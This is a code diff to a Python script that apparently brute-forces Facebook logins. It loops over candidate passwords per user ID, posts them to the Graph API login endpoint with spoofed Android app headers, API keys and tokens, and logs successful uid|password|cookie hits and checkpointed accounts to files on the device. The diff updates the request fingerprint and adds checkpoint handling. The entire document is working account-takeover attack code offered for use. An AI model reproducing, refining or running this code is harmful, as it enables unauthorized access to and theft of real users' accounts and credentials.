@@ -1359,48 +1359,56 @@ def mbasic(uid,pwx,tl):
     try:
         for pw in pwx:
             data = {
-            'adid': str(uuid.uuid4()),
-            'format': 'json',
-            'device_id': str(uuid.uuid4()),
-            'email': uid,
-            'password': pw,
-            'generate_analytics_claims': '1',
-            'community_id': '',
-            'cpl': 'true',
-            'try_num': '1',
-            'family_device_id': str(uuid.uuid4()),
-            'credentials_type': 'password',
-            'source': 'login',
-            'error_detail_type': 'button_with_disabled',
-            'enroll_misauth': 'false',
-            'generate_session_cookies': '1',
-            'generate_machine_id': '1',
-            'currently_logged_in_userid': '0',
-            'locale': 'en_GB',
-            'client_country_code': 'GB',
-            'fb_api_req_friendly_name': 'authenticate',
-            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
-            'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
-            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',}
+            "adid": str(uuid.uuid4()),
+            "format": "json",
+            "device_id": str(uuid.uuid4()),
+            "email": uid,
+            "password": "#PWD_MSGR:0:{}:{}".format(str(time.time()).split('.')[0],pw),
+            "generate_analytics_claim": "1",
+            "community_id": "",
+            "cpl": "true",
+            "try_num": "2",
+            "family_device_id": str(uuid.uuid4()),
+            "secure_family_device_id": "",
+            "credentials_type": "password",
+            "enroll_misauth": "false",
+            "generate_session_cookies": "1",
+            "source": "login",
+            "generate_machine_id": "1",
+            "jazoest": "8168",
+            "meta_inf_fbmeta": "NO_FILE",
+            "advertiser_id": str(uuid.uuid4()),
+            "currently_logged_in_userid": "0",
+            "locale": "id_ID",
+            "client_country_code": "ID",
+            "fb_api_req_friendly_name": "authenticate",
+            "fb_api_caller_class": "AuthOperations$PasswordAuthOperation",
+            "api_key": "256002347743983",
+            "sig": "e95f435d29d71f03a47918372a565cd5",
+            "access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",}
             headers = {
-            'User-Agent': UBI_(),
+            'User-Agent': f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/336.0.0.20.117;FBBV/287214784;FBDM/{density=4.0,width=1200,height=812};FBLC/en_US;FBCR/Grameenphone;FBMF/AllView;FBBD/allview;FBPN/com.facebook.katana;FBDV/ Viva H1003 LTE;FBSV/10;FBCA/armeabi-v7a:armeabi;]",
             'Accept-Encoding': 'gzip, deflate',
-            'Connection': 'close',
-            'Content-Type': 'application/x-www-form-urlencoded',
+            'Accept': '*/*',
+            'Connection': 'keep-alive',
             'Host': 'graph.facebook.com',
-            'X-FB-Net-HNI': str(random.randint(20000,40000)),
-            'X-FB-SIM-HNI': str(random.randint(20000,40000)),
-            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'X-FB-Connection-Type': 'WIFI',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Priority': 'u=3, i',
+            'X-Fb-Sim-Hni': str(random.randint(20000,40000)),
+            'X-Fb-Net-Hni': str(random.randint(20000,40000)),
+            'X-Fb-Connection-Quality': 'GOOD',
+            'Zero-Rated': '0',
+            'Authorization': 'OAuth 256002347743983|374e60f8b9bb6b8cbb30f7803043889',
+            'X-Fb-Connection-Bandwidth': '8399727',
+            'X-Fb-Connection-Type': 'MOBILE.LTE',
+            'X-Fb-Device-Group': '5535',
             'X-Tigon-Is-Retry': 'False',
-            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-            'X-FB-device-group': str(random.randint(2000, 4000)),
-            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-            'X-FB-Request-Analytics-Tags': 'graphservice',
-            'X-FB-HTTP-Engine': 'Liger',
-            'X-FB-Client-IP': 'True',
-            'X-FB-Server-Cluster': 'True',
-            'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',}
+            'X-Fb-Friendly-Name': 'authenticate',
+            'X-Fb-Request-Analytics-Tags': 'unknown',
+            'X-Fb-Http-Engine': 'Liger',
+            'X-Fb-Client-Ip': 'True',
+            'X-Fb-Server-Cluster': 'True',
+            'Content-Length': '27',}
             url = "https://graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
@@ -1428,6 +1436,11 @@ def mbasic(uid,pwx,tl):
                            open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                            oks.append(uid)
                            break
+            elif "www.facebook.com" in result["error"]["message"]:
+                print(f" {red}[SUMON-CP] {uid}|{pw}")
+                open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
+                cps.append(uid+"|"+pw)
+                break
             else:
                 continue
         loop+=1
@@ -1518,6 +1531,11 @@ def p(uid,pwx,tl):
                            open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                            oks.append(uid)
                            break
+            elif "www.facebook.com" in result["error"]["message"]:
+                print(f" {red}[SUMON-CP] {uid}|{pw}")
+                open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
+                cps.append(uid+"|"+pw)
+                break
             else:
                 continue
         loop+=1
@@ -1607,6 +1625,11 @@ def x(uid,pwx,tl):
                            open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                            oks.append(uid)
                            break
+            elif "www.facebook.com" in result["error"]["message"]:
+                print(f" {red}[SUMON-CP] {uid}|{pw}")
+                open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
+                cps.append(uid+"|"+pw)
+                break
             else:
                 continue
         loop+=1
